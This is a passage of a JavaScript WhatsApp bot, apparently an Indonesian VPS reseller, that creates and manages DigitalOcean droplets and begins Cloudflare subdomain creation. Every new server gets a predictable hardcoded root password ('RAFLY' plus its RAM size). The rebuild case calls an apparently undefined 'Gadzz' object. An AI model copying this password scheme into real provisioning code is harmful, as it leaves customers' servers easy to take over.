            title: "# Ubuntu 24.04 (LTS) x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-24-04-x64` }
            ]
        },
        {
            title: "# Ubuntu 24.10 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-24-10-x64` }
            ]
        },
        {
            title: "# Debian 11 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},debian-11-x64` }
            ]
        },
        {
            title: "# Debian 12 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},debian-12-x64` }
            ]
        },
        {
            title: "# CentOS Stream 9 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},centos-stream-9-x64` }
            ]
        }
    ];

    const buttons = [
        {
            buttonId: "action",
            buttonText: { displayText: "🔹 Pilih Spesifikasi 🔹" },
            type: 4,
            nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
            }
        }
    ];

    const message = {
        text: `📌 *Pilih Spesifikasi VPS yang Tersedia*`,
        footer: `*Akun DigitalOcean V${version}*`,
        headerType: 1,
        viewOnce: true,
        buttons,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
        }
    };

    return linux.sendMessage(m.chat, message, { quoted: qfake });
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "r1c1_v1": case "r2c1_v1": case "r2c2_v1": case "r4c2_v1": case "r8c4_v1": case "r16c4_v1": case "r16c8_v1": case "r32c8_v1": 
case "r1c1_v2": case "r2c1_v2": case "r2c2_v2": case "r4c2_v2": case "r8c4_v2": case "r16c4_v2": case "r16c8_v2": case "r32c8_v2": 
case "r1c1_v3": case "r2c1_v3": case "r2c2_v3": case "r4c2_v3": case "r8c4_v3": case "r16c4_v3": case "r16c8_v3": case "r32c8_v3": 
case "r1c1_v4": case "r2c1_v4": case "r2c2_v4": case "r4c2_v4": case "r8c4_v4": case "r16c4_v4": case "r16c8_v4": case "r32c8_v4": 
case "r1c1_v5": case "r2c1_v5": case "r2c2_v5": case "r4c2_v5": case "r8c4_v5": case "r16c4_v5": case "r16c8_v5": case "r32c8_v5": 
case "r1c1_v6": case "r2c1_v6": case "r2c2_v6": case "r4c2_v6": case "r8c4_v6": case "r16c4_v6": case "r16c8_v6": case "r32c8_v6": 
case "r1c1_v7": case "r2c1_v7": case "r2c2_v7": case "r4c2_v7": case "r8c4_v7": case "r16c4_v7": case "r16c8_v7": case "r32c8_v7": 
case "r1c1_v8": case "r2c1_v8": case "r2c2_v8": case "r4c2_v8": case "r8c4_v8": case "r16c4_v8": case "r16c8_v8": case "r32c8_v8": 
case "r1c1_v9": case "r2c1_v9": case "r2c2_v9": case "r4c2_v9": case "r8c4_v9": case "r16c4_v9": case "r16c8_v9": case "r32c8_v9": 
case "r1c1_v10": case "r2c1_v10": case "r2c2_v10": case "r4c2_v10": case "r8c4_v10": case "r16c4_v10": case "r16c8_v10": case "r32c8_v10": 
case "r1c1_v11": case "r2c1_v11": case "r2c2_v11": case "r4c2_v11": case "r8c4_v11": case "r16c4_v11": case "r16c8_v11": case "r32c8_v11": 
case "r1c1_v12": case "r2c1_v12": case "r2c2_v12": case "r4c2_v12": case "r8c4_v12": case "r16c4_v12": case "r16c8_v12": case "r32c8_v12": 
case "r1c1_v13": case "r2c1_v13": case "r2c2_v13": case "r4c2_v13": case "r8c4_v13": case "r16c4_v13": case "r16c8_v13": case "r32c8_v13": 
case "r1c1_v14": case "r2c1_v14": case "r2c2_v14": case "r4c2_v14": case "r8c4_v14": case "r16c4_v14": case "r16c8_v14": case "r32c8_v14": 
case "r1c1_v15": case "r2c1_v15": case "r2c2_v15": case "r4c2_v15": case "r8c4_v15": case "r16c4_v15": case "r16c8_v15": case "r32c8_v15": 
case "r1c1_v16": case "r2c1_v16": case "r2c2_v16": case "r4c2_v16": case "r8c4_v16": case "r16c4_v16": case "r16c8_v16": case "r32c8_v16": 
case "r1c1_v17": case "r2c1_v17": case "r2c2_v17": case "r4c2_v17": case "r8c4_v17": case "r16c4_v17": case "r16c8_v17": case "r32c8_v17": 
case "r1c1_v18": case "r2c1_v18": case "r2c2_v18": case "r4c2_v18": case "r8c4_v18": case "r16c4_v18": case "r16c8_v18": case "r32c8_v18": 
case "r1c1_v19": case "r2c1_v19": case "r2c2_v19": case "r4c2_v19": case "r8c4_v19": case "r16c4_v19": case "r16c8_v19": case "r32c8_v19": 
case "r1c1_v20": case "r2c1_v20": case "r2c2_v20": case "r4c2_v20": case "r8c4_v20": case "r16c4_v20": case "r16c8_v20": case "r32c8_v20": {
    if (!isCreator && !isPremium) return hereply(mess.premium);
    
    let [commandBase, version] = command.split("_v");
    let apiDigitalOcean = global.apiDigitalOcean[`akun${version}`];

    let [hostname, os, region] = text.toLowerCase().trim().split(",");
    let images, karanjut;

    if (!region) {
        return linux.sendMessage(m.chat, {
            buttons: [{
                buttonId: "action",
                buttonText: { displayText: "🔹 Silahkan Pilih Region VPS 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "Pilih Region VPS",
                        sections: [{
                            title: "# Silahkan Pilih Salah Satu Region Yang Tersedia",
                            highlight_label: "Populer",
                            rows: [
                                { title: "🇸🇬 Singapore", id: `${cmd} ${hostname},${os},sgp1` },
                                { title: "🇺🇸 New York", id: `${cmd} ${hostname},${os},nyc3` },
                                { title: "🇺🇸 San Francisco", id: `${cmd} ${hostname},${os},sfo3` },
                                { title: "🇳🇱 Amsterdam", id: `${cmd} ${hostname},${os},ams3` },
                                { title: "🇬🇧 London", id: `${cmd} ${hostname},${os},lon1` },
                                { title: "🇩🇪 Frankfurt", id: `${cmd} ${hostname},${os},fra1` },
                                { title: "🇨🇦 Toronto", id: `${cmd} ${hostname},${os},tor1` },
                                { title: "🇮🇳 Bangalore", id: `${cmd} ${hostname},${os},blr1` },
                                { title: "🇦🇺 Sydney", id: `${cmd} ${hostname},${os},syd1` }
                            ]
                        }]
                    })
                }
            }],
            footer: `*Akun DigitalOcean V${version}*`,
            headerType: 1,
            viewOnce: true,
            text: "Silakan Pilih Region VPS Yang Akan Dibuat",
            contextInfo: { isForwarded: true }
        }, { quoted: qfake });
    }
    
    switch (commandBase) {
        case "r1c1": images = "s-1vcpu-1gb-amd"; karanjut = "#1GB"; break;
        case "r2c1": images = "s-1vcpu-2gb-amd"; karanjut = "#2GB"; break;
        case "r2c2": images = "s-2vcpu-2gb-amd"; karanjut = "#2GB"; break;
        case "r4c2": images = "s-2vcpu-4gb-amd"; karanjut = "#4GB"; break;
        case "r8c4": images = "s-4vcpu-8gb-amd"; karanjut = "#8GB"; break;
        case "r16c4": images = "s-4vcpu-16gb-amd"; karanjut = "#16GB"; break;
        case "r16c8": images = "s-8vcpu-16gb-amd"; karanjut = "#16GB"; break;
        case "r32c8": images = "s-8vcpu-32gb-amd"; karanjut = "#32GB"; break;
        default: return hereply("❌ Spesifikasi VPS tidak valid.");
    }

    if (!isCreator && !isPremium) return hereply(mess.premium)
    let password = `RAFLY${karanjut}`;

    try {
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: os,
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                "Authorization": `Bearer ${apiDigitalOcean}`
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            await linux.sendMessage(m.chat, {
                text: `⏳ Memproses pembuatan VPS, mohon tunggu 1 menit...`,
                mentions: [m.sender],
                contextInfo: {
                    externalAdReply: {
                        title: botname,
                        body: `© Powered by ${namaOwner}`,
                        thumbnailUrl: global.image.reply,
                        sourceUrl: global.linkGrup
                    }
                }
            });
            await new Promise(resolve => setTimeout(resolve, 60000));

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    "Authorization": `Bearer ${apiDigitalOcean}`
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let aturannya = `============================
𝗚𝗔𝗥𝗔𝗡𝗦𝗜 𝗔𝗞𝗧𝗜𝗙 𝟭𝟱 𝗛𝗔𝗥𝗜 𝗔𝗣𝗔𝗕𝗜𝗟𝗔 𝗧𝗜𝗗𝗔𝗞 𝗠𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗥 𝗧.𝗢.𝗦
============================
⚠️ 𝗧.𝗢.𝗦 𝗩𝗣𝗦
- 𝗡𝗼 𝗛𝗮𝗰𝗸𝗶𝗻𝗴
- 𝗡𝗼 𝗠𝗶𝗻𝗻𝗶𝗻𝗴
- 𝗡𝗼 𝗧𝗼𝗿𝗿𝗲𝗻𝘁
- 𝗡𝗼 𝗢𝘃𝗲𝗿𝗹𝗼𝗮𝗱 (𝟭𝟬𝟬% 𝗰𝗽𝘂)
- 𝗡𝗼 𝗗𝗱𝗼𝘀
- 𝗜𝗻𝘁𝗶𝗻𝘆𝗮 𝗝𝗮𝗻𝗴𝗮𝗻 𝗗𝗶𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗨𝗻𝘁𝘂𝗸 𝗛𝗮𝗹 𝗜𝗹𝗲𝗴𝗮𝗹
============================
============================
⚠️ 𝗝𝗜𝗞𝗔 𝗔𝗞𝗨𝗡 𝗗.𝗢 𝗧𝗘𝗥𝗞𝗘𝗡𝗔 𝗦𝗨𝗦𝗣𝗘𝗡𝗗, 𝗚𝗔𝗥𝗔𝗡𝗦𝗜 𝗛𝗔𝗡𝗚𝗨𝗦 𝟳 𝗛𝗔𝗥𝗜 𝗦𝗘𝗧𝗘𝗟𝗔𝗛 𝗣𝗘𝗠𝗕𝗘𝗟𝗜𝗔𝗡.
> *Lebih Tepatnya Di Hari Ke-8 Setelah Pembelian*
============================`;

            let messageText = `✅ *VPS BERHASIL DIBUAT!* ============================\n`;
            messageText += `🆔 *ID:* ${dropletId}\n`;
            messageText += `👤 *Username:* root\n`;
            messageText += `🌐 *IP VPS:* ${ipVPS}\n`;
            messageText += `🔐 *Password:* ${password}\n`;
            messageText += `💽 *Hostname:* ${hostname}\n`;
            messageText += `📀 *OS:* ${os}\n`;
            messageText += `📍 *Region:* ${region.toUpperCase()}\n`;
            messageText += `💾 *Size:* ${images}\n`;
            messageText += `⏰ *Created:* ${tanggal(Date.now())}\n`;
            messageText += `${aturannya}`;

            await linux.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        return hereply(`⚠️ Terjadi kesalahan saat membuat VPS:\n${err.message || err}`);
    }
}
break;  
 
case "sisadroplet": {
    if (!isCreator && !isPremium) return hereply(mess.premium);

    let messages = [];
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            const [accountRes, dropletsRes] = await Promise.all([
                fetch("https://api.digitalocean.com/v2/account", {
                    headers: { Authorization: `Bearer ${apiKey}` }
                }),
                fetch("https://api.digitalocean.com/v2/droplets", {
                    headers: { Authorization: `Bearer ${apiKey}` }
                })
            ]);

            if (!accountRes.ok || !dropletsRes.ok) {
                errors.push(`⊡══════════════════════⊡\n❌ Akun DigitalOcean V${version}: Gagal mendapatkan data`);
                continue;
            }

            const accountData = await accountRes.json();
            const dropletsData = await dropletsRes.json();

            const dropletLimit = accountData.account.droplet_limit;
            const totalDroplets = dropletsData.droplets.length;
            const remainingDroplets = dropletLimit - totalDroplets;

            messages.push(
                `⊡══════════════════════⊡\n` +
                `🌟 *Akun DigitalOcean V${version}*\n` +
                `📌 *Batas Maksimum Droplet:* ${dropletLimit}\n` +
                `🚀 *Total Droplet Terpakai:* ${totalDroplets}\n` +
                `✅ *Sisa Droplet Tersedia:* ${remainingDroplets}\n`
            );
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`⊡══════════════════════⊡\n❌ Akun DigitalOcean V${version}: Terjadi kesalahan`);
        }
    }

    if (messages.length === 0) {
        return hereply("❌ Tidak ada akun DigitalOcean yang valid atau API Key tidak dikonfigurasi.");
    }

    let finalMessage = `🌐 *SISA DROPLET DIGITALOCEAN* 🌐\n\n` + messages.join("\n");
    if (errors.length > 0) {
        finalMessage += `\n\n${errors.join("\n")}`;
    }

    await hereply(finalMessage);
}
break;        
        
case "listdroplet": {
    if (!isCreator && !isPremium) return hereply(mess.premium)

    try {
        let message = "🌐 *List Droplet DigitalOcean*\n\n";
        let totalVps = 0;
        let akunDitemukan = false;

        for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
            let version = key.replace("akun", "");

            if (!apiKey || apiKey.length < 64) {
                message += `⊡══════════════════════⊡\n`;
                message += `🌟 *Akun DigitalOcean V${version}*\n   ❌ API Key tidak valid!\n\n`;
                continue;
            }

            akunDitemukan = true;
            message += `⊡══════════════════════⊡\n`;
            message += `🌟 *Akun DigitalOcean V${version}*\n`;

            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                message += `   ⚠️ Gagal mengambil data droplet!\n\n`;
                continue;
            }

            let data = await response.json();
            let droplets = data.droplets || [];
            totalVps += droplets.length;

            if (droplets.length === 0) {
                message += `   🚫 Tidak ada droplet yang tersedia!\n\n`;
            } else {
                droplets.forEach((droplet, index) => {
                    let ipv4 = droplet.networks.v4.find(net => net.type === "public")?.ip_address || "Tidak ada IP!";
                    message += `   🔹 *Droplet ${index + 1}*\n`;
                    message += `      ➤ *ID:* ${droplet.id}\n`;
                    message += `      ➤ *Hostname:* ${droplet.name}\n`;
                    message += `      ➤ *Username:* Root\n`;
                    message += `      ➤ *IP:* ${ipv4}\n`;
                    message += `      ➤ *RAM:* ${droplet.memory} MB\n`;
                    message += `      ➤ *CPU:* ${droplet.vcpus} vCPU\n`;
                    message += `      ➤ *OS:* ${droplet.image.distribution}\n`;
                    message += `      ➤ *Storage:* ${droplet.disk} GB\n`;
                    message += `      ➤ *Status:* ${droplet.status === "active" ? "✅ Aktif" : "❌ Nonaktif"}\n\n`;
                });
            }
        }

        if (!akunDitemukan) {
            message = "⚠️ Tidak ada API DigitalOcean yang dikonfigurasi dengan benar!";
        } else {
            message = `🌐 *List Droplet DigitalOcean*\n\nTotal VPS: ${totalVps}\n\n` + message;
            message += `⊡══════════════════════⊡\n`;
        }

        await linux.sendMessage(m.chat, { text: message }, { quoted: m });

    } catch (err) {
        console.error("Error fetching droplets:", err);
        await hereply("❌ Terjadi kesalahan saat mengambil data droplet.");
    }
}
break;
        
case "deldroplet": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text) return hereply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            const dropletList = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!dropletList.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            const data = await dropletList.json();
            const droplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (droplet) {
                found = true;
                const deleteResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: "DELETE",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    }
                });

                if (deleteResponse.ok) {
                    return hereply(`✅ Droplet dengan ID *${dropletId}* berhasil dihapus!\n🌟 *Akun DigitalOcean V${version}*`);
                } else {
                    const errorData = await deleteResponse.json();
                    errors.push(`❌ Akun DigitalOcean V${version}: ${errorData.message || "Kesalahan tidak diketahui"}`);
                }
            }
        } catch (error) {
            console.error(`Error di akun V${version}:`, error);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return hereply(errorMessage);
    }
}
break;
        
case "rebuild": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text) return hereply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let rebuildResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: "rebuild", image: "ubuntu-20-04-x64" })
                });

                let rebuildData = await rebuildResponse.json();

                if (!rebuildResponse.ok) {
                    return hereply(`❌ Gagal melakukan rebuild VPS:\n🌟 *Akun DigitalOcean V${version}*\n${rebuildData.message || "Terjadi kesalahan"}`);
                }

                await hereply(`🔄 *Rebuild VPS sedang diproses...*\n📡 *Droplet ID:* ${dropletId}\n🌟 *Akun DigitalOcean V${version}*\n⏳ *Status:* ${rebuildData.action.status}`);

                await sleep(60000);

                let vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: "GET",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    }
                });

                if (!vpsInfo.ok) {
                    return hereply("❌ Gagal mendapatkan informasi VPS setelah rebuild!");
                }

                let vpsData = await vpsInfo.json();
                let droplet = vpsData.droplet;
                let ipAddress = droplet.networks.v4.find(net => net.type === "public")?.ip_address || "Tidak ada IP!";
                
                let textvps = `✅ *VPS BERHASIL DI REBUILD*\n\n📡 *IP VPS:* ${ipAddress}\n💾 *Sistem Image:* ${droplet.image.slug}`;
                return await Gadzz.sendMessage(m.chat, { text: textvps }, { quoted: m });
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return hereply(errorMessage);
    }
}
break;   
        
case "restartvps": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text) return hereply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let restartResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: "reboot" })
                });

                let restartData = await restartResponse.json();

                if (!restartResponse.ok) {
                    return hereply(`❌ Gagal melakukan restart VPS:\n🌟 *Akun DigitalOcean V${version}*\n${restartData.message || "Terjadi kesalahan"}`);
                }

                return hereply(`✅ *Aksi restart VPS berhasil dimulai!*\n\n📡 *Droplet ID:* ${dropletId}\n🌟 *Akun DigitalOcean V${version}*\n🔄 *Status:* ${restartData.action.status}\n> Tunggu 1 menit ke depan untuk mengakses VPS kembali`);
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return hereply(errorMessage);
    }
}
break;     
        
case "startvps":
case "stopvps": { 
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text) return hereply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];
    let actionType = command === "startvps" ? "power_on" : "power_off";
    let actionLabel = command === "startvps" ? "start" : "stop";

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let actionResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: actionType })
                });

                let actionData = await actionResponse.json();

                if (!actionResponse.ok) {
                    return hereply(`❌ Gagal melakukan ${actionLabel} VPS:\n🌟 *Akun DigitalOcean V${version}*\n${actionData.message || "Terjadi kesalahan"}`);
                }

                return hereply(
                    `✅ *Aksi ${actionLabel} VPS berhasil dimulai!*\n\n` +
                    `📡 *Droplet ID:* ${dropletId}\n` +
                    `🌟 *Akun DigitalOcean V${version}*\n` +
                    `🔄 *Status:* ${actionData.action.status}\n` +
                    `> Tunggu beberapa saat hingga VPS sepenuhnya ${actionLabel === "start" ? "menyala" : "mati"}`
                );
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return hereply(errorMessage);
    }
}
break;
        
case "subdomain": 
case "subdo": {
    if (!isCreator) return hereply(`${mess.owner} 𝗦𝗨𝗕𝗗𝗢𝗠𝗔𝗜𝗡!`);
    if (!text || !text.includes("|")) return hereply(example("host|ipserver"));

    let [host, ip] = text.split("|").map(i => i.trim());
    let dom = Object.keys(global.subdomain);

    if (dom.length === 0) return hereply("❌ Tidak ada domain yang tersedia saat ini.");

    let list = dom.map((i, index) => ({
        header: `(${index + 1}) ${i}`,
        title: `Create Domain ${host}.${i}`,
        id: `${prefix}create_domain ${index + 1} ${host}|${ip}`
    }));

    await linux.sendMessage(m.chat, {
        buttons: [{
            buttonId: 'action',
            buttonText: { displayText: 'Pilih Domain' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝗣𝗜𝗟𝗜𝗛 𝗗𝗢𝗠𝗔𝗜𝗡',
                    sections: [{
                        title: '# List Domain Yang Tersedia',
                        highlight_label: ``,
                        rows: list
                    }]
                })
            }
        }],
        footer: `*${botname}*`,
        headerType: 1,
        viewOnce: true,
        text: "🔹 *Pilih Domain Yang Tersedia:*",
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
        }
    }, { quoted: m });
}
break;        
        
case "create_domain": {
    if (!isCreator) return hereply(mess.owner);
    if (!args[0] || isNaN(args[0])) return hereply("Domain tidak ditemukan!");
    
    const dom = Object.keys(global.subdomain);
    const domainIndex = Number(args[0]) - 1;
    
    if (domainIndex < 0 || domainIndex >= dom.length) return hereply("Domain tidak ditemukan!");
    if (!args[1] || !args[1].includes("|")) return hereply("Hostname/IP tidak ditemukan!");
    
    const tldnya = dom[domainIndex];
    const [host, ip] = args[1].split("|").map(item => item.trim());
    
    async function createSubDomain(host, ip) {
        try {
            const response = await axios.post(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                {
                    type: "A",
